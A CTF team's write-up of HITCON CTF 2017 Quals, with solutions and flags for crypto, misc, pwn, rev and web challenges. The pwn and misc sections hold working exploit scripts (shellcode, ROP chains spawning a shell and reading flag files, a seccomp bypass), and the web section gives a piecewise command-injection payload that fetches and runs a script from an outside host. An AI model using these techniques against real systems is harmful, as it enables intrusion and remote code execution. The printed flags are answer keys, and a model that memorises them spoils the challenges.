# HITCON CTF 2017 Quals


**It's recommended to read our responsive [web version](https://balsn.github.io/ctf_writeup/20171104-hitconctfquals/) of this writeup.**


 - [HITCON CTF 2017 Quals](#hitcon-ctf-2017-quals)
   - [crypto](#crypto)
     - [Luaky](#luaky)
     - [Secret Server](#secret-server)
     - [Secret Server Revenge](#secret-server-revenge)
   - [misc](#misc)
     - [Baby Ruby Escaping](#baby-ruby-escaping)
     - [Data &amp; Mining](#data--mining)
     - [Easy to say](#easy-to-say)
   - [pwn](#pwn)
     - [Start](#start)
     - [完美無瑕 <del>Impeccable Artifact</del>](#完美無瑕-impeccable-artifact)
   - [rev](#rev)
     - [Sakura](#sakura)
     - [Seccomp](#seccomp)
     - [家徒四壁 <del>Everlasting Imaginative Void</del>](#家徒四壁-everlasting-imaginative-void)
   - [web](#web)
     - [BabyFirst Revenge](#babyfirst-revenge)



## crypto

### Luaky

```lua
fight = -1
tmp = 0
chk = 0
three = 0

function play (a)
    fight = fight + 1
    if fight < 100000 then return a % 3 end
    if fight == 100000 then return 0 end

    --[[print (a, tmp)]]
    if (a+2)%3 ~= tmp then
        chk = 0
        three = 0
        --[[print(fight)]]
    end

    tmp = (tmp + a + 1) % 3
    chk = chk + 1


    if chk == 2 and three == 2 then
        three = 0
        chk = 0
        tmp = (tmp + 1) % 3
    elseif chk == 3 then
        tmp = (tmp + 1) % 3
        three = three + 1
        chk = 0
    end

    return tmp % 3
end
```

`hitcon{Hey Lu4ky AI, I am Alpaca... MEH!}`

### Secret Server

1. Collect encrypted md5 of all prefixes of flag.
2. Guess prefix by calculating plaintext md5 and try to construct some command with encrypted md5.

`hitcon{Paddin9_15_ve3y_h4rd__!!}`

### Secret Server Revenge

1. Collect encrypted md5 of all prefixes of token (56 reqs)
2. Leak MSB of last byte in plaintext md5 (56 reqs)
3. Build mapping for padding = 128~255 (128 reqs)
4. Recover last byte in plaintext md5 (56 reqs)
5. Brute-force token

`hitcon{uNp@d_M3th0D_i5_am4Z1n9!}`

## misc

### Baby Ruby Escaping

* Need a way to read file
* Need the path of flag

Solution

1. We can use AGRF and ARGV
```
ARGV.replace [FlagName]
ARGF.readline
```
2. readline has a good property `completion_append_character`
```ruby
> /home/jail   ##Press TAB key.
.bash_logout
.bashrc
.profile
jail.rb
thanks_readline_for_completing_the_name_of_flag
```
3. Get flag

`hitcon{Bl4ckb0x.br0k3n? ? puts(flag) : try_ag4in!}`

### Data & Mining

`strings | grep hitcon`

`hitcon{BTCis_so_expensive$$$$$$$}`

### Easy to say

```python
from pwn import *
import time

context.arch = 'amd64'
r = remote('52.69.40.204', 8361)

time.sleep(1)

shellcode = asm('''
mov cx, 0x1000
sub rsp, rcx
pop rcx
pop rbx
pop rsi
mov dl, 0x60
syscall
''')

r.send(shellcode)

raw_input('>')
r.send(cyclic(0x42)+asm(shellcraft.sh()))

r.interactive()
```

`hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}`

## pwn

### Start
* Buffer Overflow, can leak information from stack and overwrite return address. 
* The binary is statically linked, so it is easy to create a ROP chain to get a shell.
* Canary and NX enabled, and Partial RELRO.

Solution
1. Leak canary
2. Leak current stack address so the address of  "/bin/sh\x00" can be known
3. Build a ROP chain to perform execve()

The server only accept Ruby script, and it will take our script to run the binary.

```Ruby
r = Sock.new '127.0.0.1', 31338

r.sendline 'A'*24
r.recvline
canary = u64("\x00" + r.recvline[0...-4])
print "canary: " + canary.to_s(16) + "\n"
sleep(1)

r.sendline 'A'*63
r.recvline
stack = u64(r.recvline[0...-1] + "\x00\x00") - 344
print "stack: " + stack.to_s(16) + "\n"
sleep(1)

payload = 'A'*24+p64(canary)+p64(0)+p64(0x47a6e6)+p64(59)+p64(0)+p64(0)+p64(0x4017f7)+p64(0)+p64(0x4005d5)+p64(stack+8)+p64(0x468e75)
r.sendline payload
r.recv(2000)
sleep(1)

r.sendline "exit\n\x00\x00\x00/bin/sh\x00"
sleep(1)

r.sendline "cat /home/*/flag"
print r.recv(2000)
```
`hitcon{thanks_for_using_pwntools-ruby:D}`

### 完美無瑕 ~Impeccable Artifact~
* Arbitary write, didn't check the array index bondary.
* Canary, NX, PIE enabled and Full RELRO.
* Only some syscall are allowed. 
* However, if rax == rdx, the syscall is still allowed (line 0014).
* Perform ORW to get the flag.

Seccomp Rules:
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018
 0002: 0x20 0x00 0x00 0x00000020  A = args[2]
 0003: 0x07 0x00 0x00 0x00000000  X = A
 0004: 0x20 0x00 0x00 0x00000000  A = sys_number
 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019
 0006: 0x15 0x0c 0x00 0x00000001  if (A == write) goto 0019
 0007: 0x15 0x0b 0x00 0x00000005  if (A == fstat) goto 0019
 0008: 0x15 0x0a 0x00 0x00000008  if (A == lseek) goto 0019
 0009: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0011
 0010: 0x15 0x00 0x03 0x0000000a  if (A != mprotect) goto 0014
 0011: 0x87 0x00 0x00 0x00000000  A = X
 0012: 0x54 0x00 0x00 0x00000001  A &= 0x1
 0013: 0x15 0x04 0x05 0x00000001  if (A == 1) goto 0018 else goto 0019
 0014: 0x1d 0x04 0x00 0x0000000b  if (A == X) goto 0019
 0015: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0019
 0016: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0019
 0017: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0019
 0018: 0x06 0x00 0x00 0x00000000  return KILL
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```
Solution
```python
#!/usr/bin/env python

from pwn import *

host = '52.192.178.153'
port = 31337

# r = remote('127.0.0.1', port)
r = remote(host, port)

def menu():
    r.recvuntil('?\n')

def cmd(num):
    r.sendline(str(num))

def show(num):
    cmd(1)
    r.sendline(str(num))
    r.recvuntil("Here it is: ")
    ret = r.recvline()[:-1]
    menu()
    return ret

def memo(num, inp):
    cmd(2)
    r.sendline(str(num))
    r.recvuntil('Give me your number:\n')
    r.sendline(str(inp))
    menu()

def end():
    cmd(3)

raw_input('#')

menu()

# leak libc adress
libc = int(show(203)) - 241 - 0x20300
print 'libc:', hex(libc)

# leak code adress
code = int(show(202)) - 0xbb0
print 'code:', hex(code)

# stack address index: 231
stack = int(show(205))
print 'stack:', hex(stack)

pop_rax = libc + 0x3a998
pop_rdi = libc + 0x1fd7a
pop_rsi = libc + 0x1fcbd
pop_rdx = libc + 0x1b92
pop_rcx = libc + 0x1a97b8
mov_rdi_rax_call_rcx = libc + 0x89ae9
syscall = libc + 0xbc765

# /home/artifact/flag
memo(0, 8241920905738938415)
memo(1, 7363231885958736244)
memo(2, 6775148)

# open
memo(203, pop_rdi)
memo(204, stack - 231*8)
memo(205, pop_rsi)
memo(206, 0)
memo(207, pop_rdx)
memo(208, 2)
memo(209, pop_rax)
memo(210, 2)
memo(211, syscall)

# read
memo(212, pop_rcx)
memo(213, pop_rax)
memo(214, mov_rdi_rax_call_rcx)
memo(215, pop_rax)
memo(216, 0)
memo(217, pop_rsi)
memo(218, stack - 80*8)
memo(219, pop_rdx)
memo(220, 100)
memo(221, syscall)

# write
memo(222, pop_rax)
memo(223, 1)
memo(224, pop_rdi)
memo(225, 1)
memo(226, syscall)

end()

r.interactive()
```
`hitcon{why_libseccomp_cheated_me_Q_Q}`

## rev

### Sakura
* This binary need 400-byte input
* Need to pass the check funtion

solution

1. Use angr but need mitigate path explosion
```python
import angr
def AAADD(a):
	return a+0x400000

f=open("./sakura-fdb3c896d8a3029f40a38150b2e30a79").read()

target="C685B7E1FFFF00".decode("hex") # find wrong path to prune

allt=[]
temp=0
while f.find(target)!=-1:
	allt.append(temp+f.find(target))
	f=f[allt[-1]-temp+1:]
	temp=allt[-1]+1	

print len(allt)
alll=map(AAADD,allt)

print map(hex,alll[:10])

b=angr.Project("./sakura-fdb3c896d8a3029f40a38150b2e30a79")
a=b.factory.entry_state()
for _ in xrange(400):
	k=a.posix.files[0].read_from(1)
	a.se.add(k!=0)
	a.se.add(k!=10)
a.posix.files[0].seek(0)
a.posix.files[0].length=400
pg=b.factory.path_group(a)
pg.explore(find=0x4110CA,avoid=alll)
pg.found[0].state.posix.dump(0,"HAHA")
print pg.found[0].state.posix.dumps(0)
print pg.found[0].state.posix.dumps(1)
```

### Seccomp
The BPF code looks like
```python
for M in arguments:
    for round in range(8):
        # transform
        M0 = mul(M0, const.pop(0))
        M1 = add(M1, const.pop(0))
        M2 = add(M2, const.pop(0))
        M3 = mul(M3, const.pop(0))
        # mix
        M4 = M0 ^ M2
        M5 = M1 ^ M3
        M4_2 = mul(M4, const.pop(0))
        M5_2 = add(M5, M4_2)
        M5_3 = mul(M5_2, const.pop(0))
        M4_3 = add(M4_2, M5_3)
        M0 ^= M5_3
        M1 ^= M4_3
        M2 ^= M5_3
        M3 ^= M4_3
        # skip last round
        if round < 7:
            # swap
            tmp = M1
            M1 = M2
            M2 = tmp
    # transform
    M0 = mul(M0, const.pop(0))
    M1 = add(M1, const.pop(0))
    M2 = add(M2, const.pop(0))
    M3 = mul(M3, const.pop(0))
    # check
    assert(M3 ^ 4919 == const.pop(0))
    assert(M2 ^ 4919 == const.pop(0))
    assert(M1 ^ 4919 == const.pop(0))
    assert(M0 ^ 4919 == const.pop(0))
```
where `M` is the 64bits input split into 4 16bits integer, `mul` is multiplication under mod `0x10001`, and `add` is addition under mod `0x10000`.
Undo the transform parts by inverse elements.
For the mix parts, `M4 = M0 ^ M2 = (M0 ^ M5_3) ^ (M2 ^ M5_3) = M0_2 ^ M2_2`, then calcute `M4_3` and `M5_3` to find original `M0~M4`

### 家徒四壁 ~Everlasting Imaginative Void~

1. Notice that `.eh_frame` is corrupt and a destructor jumps to `.eh_frame`.
2. Trace code and find a check at 0x284 to check if the 16th byte of input is `!`.
3. Bypass the check and notice an AES encryption is performed on input and compared with some ciphertext.
4. Decrypt ciphertext with same set of round keys.

`hitcon{code_in_BuildID!}`

## web

### BabyFirst Revenge

Own `zxzz.tk`

```
>echo
>w\\
*>>.a
rm w*
>ge\\
*>>.a
rm g*
>t
>zx\\
*>>.a
rm t*
rm z*
>z\\
*>>.a
rm z*
>z.\\
*>>.a
rm z*
>tk
*>>.a
rm t*
>bash
b* .a
```

`hitcon{idea_from_phith0n,thank_you:)}`
